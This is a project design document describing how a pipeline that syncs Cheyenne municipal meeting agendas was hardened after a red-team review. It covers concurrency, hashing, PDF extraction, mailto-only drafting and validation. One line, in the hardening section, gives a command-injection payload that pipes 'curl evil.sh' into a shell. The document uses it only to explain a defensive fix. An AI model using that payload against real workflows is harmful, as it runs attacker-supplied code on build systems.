# Live Municipal Sync — architecture as red-teamed

This document is the implementation response to the red-team review of the live
municipal-sync architecture (Phases 1–3). Every finding is mapped to the concrete
fix, the file that implements it, and the test that locks it down. The pipeline
was built **with the flaws already fixed** — the vulnerable version was never
merged.

The pipeline in one paragraph: a scheduled watcher normalizes Cheyenne's Granicus
"Upcoming Events" table into semantic records and hashes the canonical JSON
(`scripts/monitor/upcoming-meetings.mjs`). When — and only when — the *content*
hash changes, it invokes the sync workflow (`.github/workflows/live_city_sync.yml`),
which extracts the posted agenda PDF with a layout-aware engine
(`scripts/extractors/parse_agenda_pdf.mjs`), runs an evidence-cited red-team
analysis (`scripts/analysis/red_team_analyzer.mjs`), generates mailto-only citizen
objection drafts (`scripts/actions/draft_objection.mjs`), validates every artifact
against the source text (`scripts/lib/validate.mjs`), and only then commits the
diff to `data/meetings/` under a single-flight concurrency group.

---

## Order of Magnitude 1 — Architectural & systemic vulnerabilities

### 1.1 GitHub Actions concurrency & race-condition bottleneck ✅ FIXED

**Finding:** one full build per agenda change ⇒ concurrent runners cloning,
committing and pushing `main` ⇒ merge conflicts and a broken deploy loop.

**Fix (implemented):**

| Layer | What |
| --- | --- |
| Serialization | Both workflows share `concurrency: group: municipal-data-sync` with `cancel-in-progress: false`. Runs **queue** — they never race and are never cancelled mid-write. |
| Trigger convergence | External dispatchers hit `repository_dispatch`; the in-repo watcher invokes the same job via `workflow_call`. One write lane, two doors. |
| Belt & braces | The commit step still does `git pull --rebase` before `push` — a human commit landing between clone and push rebases cleanly instead of conflicting. |
| Idempotence | The diff guard (`git diff --cached --quiet`) makes a re-run of the same data a no-op. A stale watch baseline re-fires the pipeline, which re-extracts, re-validates and commits *nothing*. Self-healing, no loop. |
| Data decoupling | Pipeline artifacts land in **`data/meetings/<year>/`**, which the site build never reads (the site builds from `src/data/` + `public/data/`). A bad sync cannot touch the deployed site — this is the in-repo version of the "decouple data storage" recommendation. The S3/Supabase escalation remains available if volume ever demands it, without changing a single script contract. |

**Code:** `.github/workflows/live_city_sync.yml`, `.github/workflows/live_city_watch.yml`, `scripts/sync/plan.mjs`
**Tests:** "sync workflow: serialized concurrency group…", "watch workflow: shares the write lane…"

### 1.2 The DOM-hashing fallacy ✅ FIXED

**Finding:** hashing the DOM of the upcoming-meetings table fires on every request
because Granicus decorates markup with session ids, nonces and tracking params.

**Fix (implemented):** the watcher never sees markup.

1. `scripts/lib/upcoming-table.mjs` reduces the page to semantic records —
   `{body, bodyLabel, date, time, agendaUrl}` — by cell *meaning* (the table whose
   header names Name/Date/Agenda), so class names, attribute order, hidden spans
   and script tags never survive parsing.
2. `scripts/lib/canonical.mjs` normalizes each field: tracking params
   (`utm_*`, `_ga`, `jsid`, …) are dropped, semantic params (`view_id`, `event_id`,
   `clip_id`) are kept and sorted; dates/times collapse to one canonical form.
3. The hash is SHA-256 over stable-JSON of the **sorted record set** — row order
   and whitespace cannot flip it either.
4. A structural surprise (portal redesign, maintenance page) **fails closed** with
   `ENO_TABLE` — a broken watcher can never masquerade as "no changes".

**Calibration:** the record shape was calibrated against the live widget
(`ViewPublisher.php?view_id=5&widget=upcoming`) and the curated October 3 snapshot;
`npm run sync:seed` builds the baseline from that snapshot, so the first scheduled
run is a **zero-false-positive** by construction (proven by a test).

**Code:** `scripts/lib/canonical.mjs`, `scripts/lib/upcoming-table.mjs`, `scripts/monitor/upcoming-meetings.mjs`, `data/sync-state.json` (committed baseline)
**Tests:** the entire "OM1#2" suites — including one that mutates session ids,
nonces, class names and adds tracking params and asserts the hash is unchanged,
and one that moves a meeting time and asserts it *is*.

---

## Order of Magnitude 2 — AI processing & automation risks

### 2.1 Layout blindness in PDF scraping ✅ FIXED

**Finding:** `pdf-parse`-style extractors merge adjacent columns into garbage
lines; LLMs then hallucinate structure; scanned uploads extract as silent
empty strings.

**Fix (implemented):** `scripts/lib/pdf-layout.mjs` reconstructs **geometry**
instead of trusting content-stream order:

- positioned text items from `pdfjs-dist` (x, y, width per run);
- items clustered into visual lines by baseline with font-relative tolerance;
- column gutters detected by a rate-based x-occupancy projection (a vertical band
  occupied by <15% of lines), so full-width page headers don't defeat detection;
- reading order emitted **column by column**, with shared-baseline lines split
  per column — the precise interleaving failure mode of naive extractors;
- the agenda grammar (`scripts/lib/agenda-structure.mjs`) consumes those
  column-aware reading lines, and a column break closes the open item so a
  right-column heading can never glue itself onto a left-column item.

**Failure modes are loud and typed:** `ENCRYPTED`, `CORRUPT`, `NO_TEXT`
(scanned ⇒ OCR needed), `EMPTY_INPUT`, `TOO_LARGE`, `TIMEOUT`, `HTTP_*`,
`NO_PDF_LINK` (viewer chrome without a PDF). Extraction either produces real
positioned text or throws — an empty success is impossible.

**Downstream hallucination containment:** the default analyzer is a
deterministic rules engine (zero hallucination surface). The optional `--llm`
pass is quarantined behind the same evidence gate as everything else: findings
whose quotes are not verbatim substrings of the agenda text are **dropped**
before they can reach a commit. Every finding carries page-cited verbatim
quotes, and `scripts/lib/validate.mjs` re-checks them before any git write.

**Calibration:** the engine is tested against (a) a synthetic two-column agenda
built from the *real* October 5 PSC item texts, and (b) the real Cheyenne
"Record of Proceedings" PDF already in `public/sources/` (5 pages, verified
single-column, intact text).

**Code:** `scripts/lib/pdf-layout.mjs`, `scripts/lib/agenda-structure.mjs`, `scripts/extractors/parse_agenda_pdf.mjs`, `scripts/analysis/red_team_analyzer.mjs`
**Tests:** "OM2#1" suites — including an adversarial fixture that *proves* the
naive stream order interleaves and that the engine doesn't.

### 2.2 The form-submission API trap ✅ FIXED (pivoted)

**Finding:** automated POSTs into OpenGov/Granicus intake endpoints walk into
Cloudflare walls, CSRF checks and reCAPTCHA v3; the source IP gets blacklisted
as spam/DDoS.

**Fix (implemented):** `scripts/actions/draft_objection.mjs` performs **zero
network calls**. It generates an RFC 6068 `mailto:` link (plus copy-paste
fields in markdown) with the recipient, subject line and item-cited objection
body pre-filled; the final send stays under organic human control in the
citizen's own mail client.

**Anti-fabrication:** the drafter does not invent recipient addresses. The
recipient comes from `--to` or `data/contacts.json` (deliberately shipped as
`null` with instructions to verify an address on cheyennecity.org). No verified
recipient ⇒ drafts are skipped with a loud warning and the sync continues —
never a guessed mailbox, never a blocked pipeline.

**Code:** `scripts/actions/draft_objection.mjs`, `data/contacts.json`
**Tests:** "OM2#2 objection drafter (mailto pivot)" suite.

---

## Order of Magnitude 3 — Low-level code & implementation bugs

### 3.1 The payload variable mismatch ✅ FIXED

**Finding:** `github.event.client_payload.payload.pdf_source_url` is undefined —
custom dispatch data lives **flat** under `client_payload.*`.

**Fix (implemented):** the workflow maps
`${{ github.event.client_payload.pdf_source_url }}` / `pdf_source_urls` (flat).
`scripts/sync/build-plan.mjs` is the single contract-enforcement point: a missing
payload fails fast with the documented JSON contract printed; the deprecated
nested `client_payload.payload.*` shape is tolerated **once** with a deprecation
warning (graceful migration instead of a crash), then removed.

**Code:** `.github/workflows/live_city_sync.yml`, `scripts/sync/build-plan.mjs`
**Tests:** "OM3#1 payload normalization" suite (flat keys, legacy warning, empty
contract failure, meeting-id derivation from real Cheyenne document names).

### 3.2 Absence of error cascades & recovery paths ✅ FIXED

**Finding:** the linear `extract && analyze` chain still let the commit step run,
pushing broken/empty structures into `main` and breaking the site.

**Fix (implemented):** the chain is now strictly ordered and gated —

```
normalize payload → extract (fail-fast, typed errors) → analyze → draft (optional)
→ VALIDATE → refresh baseline (best-effort) → commit (guarded diff check)
```

- Every processing step is a separate workflow step: GitHub Actions skips the
  rest on failure, and the commit step is the last one.
- `scripts/lib/validate.mjs` runs **before any git command** and verifies:
  required fields, non-empty item sets, in-range page numbers, duplicate item
  numbers, **verbatim quotes present in the source text** (agenda *and*
  analysis), no leftover `.tmp` partial writes.
- All writes are atomic (tmp + rename) — a crashed writer cannot leave a
  half-written artifact.
- The extractor deletes nothing and writes nothing on failure; a scanned or
  password-protected PDF stops the job with a typed error before any git write.
- And because the site build never reads `data/`, even a hypothetical bad commit
  cannot break the deployed site (blast-radius containment).

**Code:** `scripts/lib/validate.mjs`, `scripts/lib/atomic.mjs`, step ordering in `live_city_sync.yml`
**Tests:** "OM3#2 validation gate" suite — fabricated evidence quote rejected,
tampered agenda quote rejected, leftover `.tmp` rejected, sound artifacts pass.

---

## Findings beyond the review (hardening added during implementation)

1. **Expression injection via `client_payload`.** The reviewed fix interpolated
   payload values directly inside `run:` blocks — a hostile dispatcher could
   execute shell code (`"; curl evil.sh | sh; #`). All payload values now enter
   scripts through `env:` mappings, and a test asserts **no `${{ }}` appears
   inside any `run:` block**.
2. **`GITHUB_TOKEN` cannot trigger `repository_dispatch` workflows** (GitHub's
   recursion guard) — an in-repo dispatcher would silently do nothing. The watch
   workflow therefore invokes the reusable sync workflow via `workflow_call`
   instead; external dispatchers are documented to need a PAT/App token.
3. **`checkedAt`-style metadata is excluded from change detection** — only the
   content hash is compared, so a refreshed timestamp can never look like a data
   change.
4. **Viewer indirection.** Granicus `AgendaViewer.php` URLs are HTML chrome, not
   PDFs; the extractor resolves the underlying PDF link (preferring the city's
   document host) and fails with `NO_PDF_LINK` if the portal stops exposing one,
   rather than silently "extracting" an error page.

---

## Operating runbook

```bash
npm run sync:seed      # once: build data/sync-state.json from the curated snapshot
npm run sync:watch     # manual check: fetch, normalize, hash, compare
npm run test:sync      # the full red-team regression suite (43 tests)
```

**Enabling the workflows** (nothing to do for the tests — this is for production):

1. The watch workflow runs hourly (`cron: 23 * * * *`) and invokes the sync only
   on a semantic change. No secrets are required for rules-only analysis.
2. Optional secrets: `OPENAI_API_KEY` (enables the quarantined `--llm` pass),
   `OBJECTION_RECIPIENT` (enables objection drafts; otherwise skipped loudly).
3. Optional variable: `OPENAI_MODEL` (default `gpt-4o-mini`).
4. External watchers dispatch with:

   ```json
   POST /repos/therealwindycity/TheReelWindyCity/dispatches
   {
     "event_type": "MUNICIPAL_AGENDA_ALTERATION",
     "client_payload": {
       "pdf_source_url": "https://www.cheyennecity.org/files/…/psc-10-05-26-agenda.pdf",
       "meeting_id": "public-services-committee-2026-10-05",
       "item_id": "15",
       "reason": "lambda-watch"
     }
   }
   ```

   (flat `client_payload` keys — see §3.1). Note the caller needs a PAT or App
   token; the default `GITHUB_TOKEN` will not start the workflow.

5. If `main` is branch-protected against `GITHUB_TOKEN` pushes, either allow the
   bot or point the commit step at a sync branch + PR — the concurrency group
   and validation gate stay identical either way.

**Promotion to the site:** pipeline artifacts under `data/meetings/` are
validated, versioned raw material. Promoting an agenda into the curated snapshot
(`src/data/official-meetings.json`) stays a human-reviewed step by design — the
same no-invented-data discipline the rest of the site follows.
